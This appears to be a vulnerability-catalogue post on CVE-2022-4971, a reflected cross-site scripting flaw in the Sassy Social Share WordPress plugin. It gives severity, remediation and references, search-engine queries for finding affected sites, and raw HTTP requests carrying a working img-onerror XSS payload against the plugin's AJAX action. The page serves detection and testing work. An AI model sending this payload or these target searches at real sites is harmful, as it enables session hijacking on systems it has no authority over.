---
layout: post
cve_id: CVE-2022-4971
title: Sassy Social Share <= 3.3.3 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-4971.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-4971.yaml
snort2_rule: N/A
snort3_rule: N/A
author: popcorn94
severity: medium
impact: 'Unauthenticated attackers can inject malicious JavaScript through the urls
  parameter in the sharing count AJAX action, potentially stealing WordPress user
  sessions and performing actions on behalf of authenticated users.

  '
remediation: 'Update Sassy Social Share plugin to a version newer than 3.3.3 that
  properly sanitizes the urls parameter and encodes output in the AJAX action.

  '
reference:
- https://www.wordfence.com/threat-intel/vulnerabilities/id/85277960-2bba-4cd7-9f4c-e04f6743b96c?source=cve
- https://wpscan.com/vulnerability/4631519b-2060-43a0-b69b-b3d7ed94c705/
- https://nvd.nist.gov/vuln/detail/CVE-2022-4971
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-4971
  cwe-id: CWE-79
  epss-score: 0.06718
  epss-percentile: 0.90974
  cpe: cpe:2.3:a:heateor:sassy_social_share:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: heateor
  product: sassy_social_share
  framework: wordpress
  shodan-query: http.html:"/wp-content/plugins/sassy-social-share"
  fofa-query: body=/wp-content/plugins/sassy-social-share/
  publicwww-query: /wp-content/plugins/sassy-social-share/
  google-query: inurl:"/wp-content/plugins/sassy-social-share"
tags:
- wpscan
- cve
- cve2022
- wordpress
- wp-plugin
- wp
- sassy-social-share
- xss
- authenticated
- vkev
- vuln
---

## ðŸ” Vulnerability Description
The Sassy Social Share plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via the 'urls' parameter called via the 'heateor_sss_sharing_count' AJAX action in versions up to, and including, 3.3.3 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
log=9d45VX&pwd=5QM6bM&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[<img%20src%3dx%20onerror%3dalert(document.domain)>] HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

